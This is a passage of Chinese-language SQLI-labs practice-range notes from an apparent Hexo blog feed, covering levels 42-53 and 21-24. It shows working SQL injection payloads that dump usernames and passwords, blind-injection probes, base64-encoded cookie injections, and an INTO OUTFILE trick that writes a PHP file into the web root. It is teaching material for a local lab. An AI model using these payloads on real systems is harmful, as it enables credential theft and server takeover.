src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/04.png" alt="Less-42"></p><p>同理这里也可以进行盲注和堆叠查注入，这里不再赘述。</p><h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注、堆叠注入</td><td><code>username=(&#39;$username&#39;)</code></td></tr></tbody></table><p>和 Less-42 的利用方式一致，这里只是拼接方式不一样而已，不再赘述。</p><h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、布尔盲注、延时盲注、堆叠注入</td><td><code>username=&#39;$username&#39;</code></td></tr></tbody></table><p>和 Less-43 的利用方式一致，因为没有输出报错信息，所以这里少了报错注入的利用方式。</p><h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、布尔盲注、延时盲注、堆叠注入</td><td><code>username=(&#39;$username&#39;)</code></td></tr></tbody></table><p>与 Less-43 闭合方式一致，只是这里少了报错注入的利用方法。</p><h2 id="Less-46-order-by后的注入"><a href="#Less-46-order-by后的注入" class="headerlink" title="Less-46(order by后的注入)"></a>Less-46(order by后的注入)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>ORDER BY $id</code></td></tr></tbody></table><pre><code class="hljs Php"><span class="hljs-comment"># GET 方式获取 sort 参数</span><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sort&#x27;</span>];<span class="hljs-comment"># 直接将 id 带入 SQL 中</span><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users ORDER BY <span class="hljs-subst">$id</span>&quot;</span>;<span class="hljs-keyword">if</span> 查询成功：    输出查询信息<span class="hljs-keyword">else</span>：    print_r(mysql_error());</code></pre><p>order by 不同于 where 后的注入点，不能使用 union 等进行注入。注入方式十分灵活，下面在本关来详细讲解一下。</p><h3 id="验证方式"><a href="#验证方式" class="headerlink" title="验证方式"></a>验证方式</h3><ul><li><strong>升序和降序验证</strong></li></ul><pre><code class="hljs Bash"><span class="hljs-comment"># 升序排序</span>?sort=1 asc<span class="hljs-comment"># 降序排序</span>?sort=1 dasc</code></pre><ul><li><strong>rand() 验证</strong></li></ul><p>rand(ture) 和 rand(false) 的结果是不一样的</p><pre><code class="hljs Bash">?sort=rand(<span class="hljs-literal">true</span>)?sort=rand(<span class="hljs-literal">false</span>)</code></pre><p>所以利用这个可以轻易构造出一个布尔和延时类型盲注的测试 payload</p><p>此外 rand() 结果是一直都是随机的</p><pre><code class="hljs Bash">?sort=rand()?sort=1 and rand()</code></pre><ul><li><strong>延时验证</strong></li></ul><pre><code class="hljs bash">?sort=sleep(1)?sort=(sleep(1))?sort=1 and sleep(1)</code></pre><p>这种方式均可以延时，延时的时间为 (行数*1) 秒</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h4><p><code>?sort=1 and updatexml(1,concat(&#39;~&#39;,(select group_concat(schema_name)from information_schema.schemata)),0)</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/05.png" alt="Less-46">可见一次把数据库名爆不完，所以可以采用<code>limit</code>语句控制一次爆库名的个数</p><p><code>?sort=1 and updatexml(1,concat(&#39;~&#39;,(select schema_name from information_schema.schemata limit 4,1)),0)</code><br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/06.png" alt="Less-46"></p><h4 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h4><p><code>?sort=1 and updatexml(1,concat(&#39;~&#39;,(select group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39;)),0)</code><br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/07.png" alt="Less-46"></p><h4 id="爆users表的表列"><a href="#爆users表的表列" class="headerlink" title="爆users表的表列"></a>爆<code>users</code>表的表列</h4><p><code>?sort=1 and updatexml(1,concat(&#39;~&#39;,(select group_concat(column_name)from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)),0)</code><br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/08.png" alt="Less-46"></p><h4 id="爆users表的数据"><a href="#爆users表的数据" class="headerlink" title="爆users表的数据"></a>爆<code>users</code>表的数据</h4><p><code>?sort=1 and updatexml(1,concat(&#39;~&#39;,(select concat_ws(&#39;~&#39;,id,username,password)from security.users limit 0,1)),0)</code><br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/09.png" alt="Less-46"></p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>数据库第 1 位为：s</p><pre><code class="hljs sql">?sort=rand(left(database(),1)&gt;&#x27;r&#x27;)?sort=rand(left(database(),1)&gt;&#x27;s&#x27;)?sort=rand(left(database(),2)&gt;&#x27;sd&#x27;)?sort=rand(left(database(),2)&gt;&#x27;se&#x27;)</code></pre><h3 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h3><p>数据库第一个字母的 ascii 码为 115，即<code>s</code></p><pre><code class="hljs sql">?sort=rand(if(ascii(substr(database(),1,1))&gt;114,1,sleep(1)))?sort=rand(if(ascii(substr(database(),1,1))&gt;115,1,sleep(1)))</code></pre><h3 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h3><p><strong>将查询结果导入到文件中</strong>：</p><pre><code class="hljs Sql">?sort=1 into outfile &quot;D:/phpstudy_pro/WWW/sqli.pl/Less-46/less46.txt&quot;</code></pre><p>如果导入不成功的话，很可能是因为 Web 目前 MySQL 没有读写权限造成的。</p><p><strong>利用导出文件 getshell</strong>：</p><p>注入天书里面提供了 lines terminated by 姿势用于 order by 的情况来 getsgell：</p><pre><code class="hljs Payload">?sort&#x3D;1 into outfile &quot;D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;sqli.pl&#x2F;Less-46&#x2F;shell.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e</code></pre><p>3c3f70687020706870696e666f28293b3f3e 是 <code>&lt;php phpinfo();&gt;</code> 的十六进制编码。</p><p>来查看下写入的文件内容是啥样子的：</p><pre><code class="hljs Bash">1DumbDumb&lt;?php phpinfo();?&gt;2AngelinaI-kill-you&lt;?php phpinfo();?&gt;3Dummyp@ssword&lt;?php phpinfo();?&gt;4securecrappy&lt;?php phpinfo();?&gt;5stupidstupidity&lt;?php phpinfo();?&gt;6supermangenious&lt;?php phpinfo();?&gt;7batmanmob!le&lt;?php phpinfo();?&gt;8adminadmin&lt;?php phpinfo();?&gt;9admin1admin1&lt;?php phpinfo();?&gt;10admin2admin2&lt;?php phpinfo();?&gt;11admin3admin3&lt;?php phpinfo();?&gt;12dhakkandumbo&lt;?php phpinfo();?&gt;14admin4admin4&lt;?php phpinfo();?&gt;15helloworld&lt;?php phpinfo();?&gt;</code></pre><p>浏览器访问测试看看：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/10.png" alt="Less-46"></p><h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>ORDER BY &#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-46 相比，利用方式不变，只是拼接方式方式变化，注入的时候只要正常闭合即可。</p><pre><code class="hljs sql">?sort=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;~&#x27;</span>,<span class="hljs-keyword">id</span>,username,<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span> security.users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">0</span>) <span class="hljs-comment">--+</span></code></pre><h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>ORDER BY $id</code></td></tr></tbody></table><p>和 Less-46 相比少了报错注入，布尔、延时盲注依然可以正常使用，这里不再过多演示了。</p><h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>ORDER BY &#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-47 相比少了报错注入，布尔、延时盲注依然可以正常使用，这里不再过多演示了。</p><h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注、堆叠注入</td><td><code>ORDER BY $id</code></td></tr></tbody></table><p>和 Less-46 相比，查询方式由 mysql_query 变成了 mysqli_multi_query，因此支持堆叠注入，在注入方面会更加灵活。堆叠注入的话这里不再演示，详细细节可以参考 Less-38 的堆叠注入的姿势。</p><h2 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注、堆叠注入</td><td><code>ORDER BY &#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-50 相比只是拼接方式发生了变化，实际注入的时候只需做一下对应的闭合即可。</p><h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注、堆叠注入</td><td><code>ORDER BY $id</code></td></tr></tbody></table><p>和 Less-50 是一样的，只是少了报错注入的利用方式。</p><h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注、堆叠注入</td><td><code>ORDER BY &#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-51 是一样的，只是少了报错注入的利用方式。</p>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
      <tag>sqli lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQLI labs 靶场笔记之高级注入姿势 21-37 关</title>
    <link href="/p/4c595109.html"/>
    <url>/p/4c595109.html</url>
    
    <content type="html"><![CDATA[<h1 id="高级注入姿势-21-37-关"><a href="#高级注入姿势-21-37-关" class="headerlink" title="高级注入姿势 21-37 关"></a>高级注入姿势 21-37 关</h1><h2 id="Less-21-Cookie-Base64编码注入"><a href="#Less-21-Cookie-Base64编码注入" class="headerlink" title="Less-21(Cookie Base64编码注入)"></a>Less-21(Cookie Base64编码注入)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=(&#39;$cookee&#39;)</code></td></tr></tbody></table><p><strong>简单源码分析</strong>：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> cookie 中不存在 uname 参数:      输出了一堆无用的信息    <span class="hljs-keyword">if</span> 提交了 uname 和 passwd:        <span class="hljs-comment"># 进行过滤</span>        <span class="hljs-variable">$uname</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]);        <span class="hljs-variable">$passwd</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]);        <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="hljs-subst">$uname</span> and users.password=<span class="hljs-subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;        <span class="hljs-keyword">if</span> 有查询结果:            <span class="hljs-comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span>            setcookie(<span class="hljs-string">&#x27;uname&#x27;</span>, base64_encode(<span class="hljs-variable">$row1</span>[<span class="hljs-string">&#x27;username&#x27;</span>]), time()+<span class="hljs-number">3600</span>);            <span class="hljs-keyword">else</span>:            print_r(mysql_error());<span class="hljs-keyword">else</span>:    <span class="hljs-keyword">if</span> POST 数据里面没有 submit 参数:                 <span class="hljs-comment"># 对 cookee 进行 base64 解密</span>        <span class="hljs-variable">$cookee</span> = base64_decode(<span class="hljs-variable">$cookee</span>);        <span class="hljs-comment"># 直接将 cookee 通过单引号拼接到 SQL 语句中</span>        <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;        <span class="hljs-keyword">if</span> 查询无结果:            输出 mysql_error()        <span class="hljs-keyword">if</span> 有结果:            输出查询的信息    <span class="hljs-keyword">else</span>:        <span class="hljs-comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span>        setcookie(<span class="hljs-string">&#x27;uname&#x27;</span>, base64_encode(<span class="hljs-variable">$row1</span>[<span class="hljs-string">&#x27;username&#x27;</span>]), time()<span class="hljs-number">-3600</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>从源码中分析可得，和 Less-20 基本上是一毛一样，只是 Coojie 这里是经过 base64 加密的，所以我们只需要传入加密后的 payload 给 cookie 的 uname 即可，下面就只用报错注入来简单演示一下吧：</p><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-21/index.php</span> HTTP/1.1<span class="hljs-attribute">Host</span>: sqli.pl<span class="hljs-attribute">Cache-Control</span>: max-age=0<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<span class="hljs-attribute">Referer</span>: http://sqli.pl/Less-21/<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.9<span class="hljs-attribute">Cookie</span>: uname=YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCB1c2VybmFtZSBmcm9tIHVzZXJzIGxpbWl0IDEsMSksMHg3ZSksMSkj<span class="hljs-attribute">Connection</span>: close</code></pre><p>Cookie 的 uname 参数 Base64 解码为：</p><pre><code class="hljs sql">admin&#x27;) and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span></code></pre><p>联合注入</p><pre><code class="hljs sql">-admin&#x27;) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">#</span></code></pre><h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=&quot;$cookee&quot;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>：</p><pre><code class="hljs php"><span class="hljs-comment"># 先双引号 然后直接拼接到SQL语句中</span><span class="hljs-variable">$cookee1</span> = <span class="hljs-string">&#x27;&quot;&#x27;</span>. <span class="hljs-variable">$cookee</span>. <span class="hljs-string">&#x27;&quot;&#x27;</span>;    <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE username=<span class="hljs-subst">$cookee1</span> LIMIT 0,1&quot;</span>;</code></pre><p>可以发现和 Less-21 相比，只是拼接方式不一样，其他都是一致的，这里就不再啰嗦了。</p><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-22/index.php</span> HTTP/1.1<span class="hljs-attribute">Host</span>: sqli.pl<span class="hljs-attribute">Pragma</span>: no-cache<span class="hljs-attribute">Cache-Control</span>: no-cache<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<span class="hljs-attribute">Referer</span>: http://sqli.pl/Less-22/<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.9<span class="hljs-attribute">Cookie</span>: uname=LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLChzZWxlY3QgZ3JvdXBfY29uY2F0KHVzZXJuYW1lLCc6JyxwYXNzd29yZCkgZnJvbSB1c2VycykgIw==<span class="hljs-attribute">Connection</span>: close</code></pre><p>Cookie 的 uname 参数 Base64 解码为：</p><pre><code class="hljs sql">-admin&quot; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">#</span></code></pre><h2 id="Less-23-过滤-、–注释"><a href="#Less-23-过滤-、–注释" class="headerlink" title="Less-23(过滤#、–注释)"></a>Less-23(过滤#、–注释)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>：</p><pre><code class="hljs php"><span class="hljs-comment"># 获取到 id 的值</span><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<span class="hljs-comment"># 过滤了 id 中的 # 和 -- 然后 替换为 空</span><span class="hljs-variable">$reg</span> = <span class="hljs-string">&quot;/#/&quot;</span>;<span class="hljs-variable">$reg1</span> = <span class="hljs-string">&quot;/--/&quot;</span>;<span class="hljs-variable">$replace</span> = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-variable">$id</span> = preg_replace(<span class="hljs-variable">$reg</span>, <span class="hljs-variable">$replace</span>, <span class="hljs-variable">$id</span>);<span class="hljs-variable">$id</span> = preg_replace(<span class="hljs-variable">$reg1</span>, <span class="hljs-variable">$replace</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 使用单引号拼接 SQL</span><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-keyword">if</span> 有查询结果:    输出查询信息<span class="hljs-keyword">else</span>:    print_r(mysql_error());</code></pre><p><strong>过滤了注释符号</strong>，但是这里还可以考虑使用闭合方式来进行注入，下面直接使用最简单的联合查询注入吧：</p><p>Payload</p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><h2 id="Less-24-二次注入"><a href="#Less-24-二次注入" class="headerlink" title="Less-24(二次注入)"></a>Less-24(二次注入)</h2><p>一个经典的二次注入场景，所以下面来单个理一下源码。</p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><ul><li><code>index.php</code></li></ul><p>主要记录了表单相关的信息，没有啥敏感代码，当做 Index.html 来看待就可以了，具体的界面如下：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/01.png" alt="Less-24(二次注入)"></p><p>提示输入用户名和密码，用户名和密码正确之后就可以成功登陆，否则登陆失败。</p><p><code>忘记密码</code>：左下角的忘记密码选项提示：如果你忘记密码 请 hack it</p><p><code>新建用户</code>：右下角新建用户可以新建一个自己的用户</p><ul><li><code>failed.php</code></li></ul><p>检测会话，如果 cookie 里面没有 Auth 参数的话，就跳转到 index.php</p><ul><li><code>forgot_password.php</code></li></ul><p>简单提示：如果你忘记密码 请 hack it</p><ul><li><code>Logged-in.php</code></li></ul><p>登录后的信息展示，显示登录名称并且提供了修改密码的表单</p><ul><li><code>new_user.php</code></li></ul><p>创建新用户的表单页面，本文件主要存放前段代码。</p><ul><li><code>login_create.php</code></li></ul><p>创建新用户的后端代码，下面来简单理一下代码的流程：</p><pre><code class="hljs Php"><span class="hljs-comment"># 接受用户提交的用户名和密码值 并进行 mysql 安全函数转义</span>username=  mysql_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) ;<span class="hljs-variable">$pass</span>= mysql_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<span class="hljs-variable">$re_pass</span>= mysql_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;re_password&#x27;</span>]);<span class="hljs-comment"># 查询当前用户信息</span><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select count(*) from users where username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;如果当前用户已经存在 无法注册<span class="hljs-keyword">if</span> 两次输入密码一致：  <span class="hljs-comment"># 将记录插入数据库中</span>  <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into users ( username, password) values(\&quot;<span class="hljs-subst">$username</span>\&quot;, \&quot;<span class="hljs-subst">$pass</span>\&quot;)&quot;</span>;    查询完成后 重定向到首页<span class="hljs-keyword">else</span>:    提示两次输入密码不一致</code></pre><ul><li><code>login.php</code></li></ul><pre><code class="hljs Php"><span class="hljs-comment"># 登录用户名和密码都被过滤了</span><span class="hljs-variable">$username</span> = mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_user&quot;</span>]);<span class="hljs-variable">$password</span> = mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_password&quot;</span>]);<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>;</code></pre><ul><li><code>pass_change.php</code></li></ul><pre><code class="hljs Php"><span class="hljs-keyword">if</span> 检测未登录：    重定向到首页<span class="hljs-keyword">if</span> 检测到提交表单：  <span class="hljs-comment"># 对 pass 都进行了过滤</span>  <span class="hljs-variable">$username</span>= <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>];    <span class="hljs-variable">$curr_pass</span>= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;current_password&#x27;</span>]);    <span class="hljs-variable">$pass</span>= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);    <span class="hljs-variable">$re_pass</span>= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;re_password&#x27;</span>]);    <span class="hljs-keyword">if</span> 两次密码一致:        <span class="hljs-comment"># 直接将 username 拼接到 SQL 语句</span>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="hljs-subst">$pass</span>&#x27; where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$curr_pass</span>&#x27; &quot;</span>;    <span class="hljs-keyword">else</span>:        提示密码不一致 并重定向到 fail.php</code></pre><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>从代码上来看貌似都被转义了，乍一看是成功注入的。实际上的确不能使用常规的思路来进行注入，因为这题是二次注入，ISCC 2019 当时使用这题的考查点是修改掉 admin 用户的密码，然后再登录即可。假设不知道 admin 用户的情况下，想要修改掉 admin 用户的密码的话，这里就使用的是二次注入的姿势了。</p><p><strong>二次注入</strong> 简单概括就是黑客精心构造 SQL 语句插入到数据库中，数据库报错的信息被其他类型的 SQL 语句调用的时候触发攻击行为。因为第一次黑客插入到数据库的时候并没有触发危害性，而是再其他语句调用的时候才会触发攻击行为，这个就是二次注入。</p><p>先看创建用户的地方：</p><pre><code class="hljs php">username =  mysql_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) ;</code></pre><p>username 被 <code>mysql_escape_string</code> 函数过滤了，该函数的作用如下：</p><table><thead><tr><th>危险字符</th><th>转义后</th></tr></thead><tbody><tr><td><code>\</code></td><td><code>\\</code></td></tr><tr><td><code>&#39;</code></td><td><code>\&#39;</code></td></tr><tr><td><code>&quot;</code></td><td><code>\&quot;</code></td></tr></tbody></table><p>再看下更新密码的核心语句：</p><pre><code class="hljs Sql"><span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">SET</span> <span class="hljs-keyword">PASSWORD</span>=<span class="hljs-string">&#x27;$pass&#x27;</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;$username&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span>=<span class="hljs-string">&#x27;$curr_pass&#x27;</span></code></pre><p>这里直接使用单引号拼接了 username 所以当 username 可控的话 ，这里是存在SQL注入的，假设用户注册的 username 的值为：<code>admin&#39;#</code>，那么此时的完整语句就为：</p><pre><code class="hljs Sql"><span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">SET</span> <span class="hljs-keyword">PASSWORD</span>=<span class="hljs-string">&#x27;$pass&#x27;</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;admin&#x27;</span><span class="hljs-comment"># and 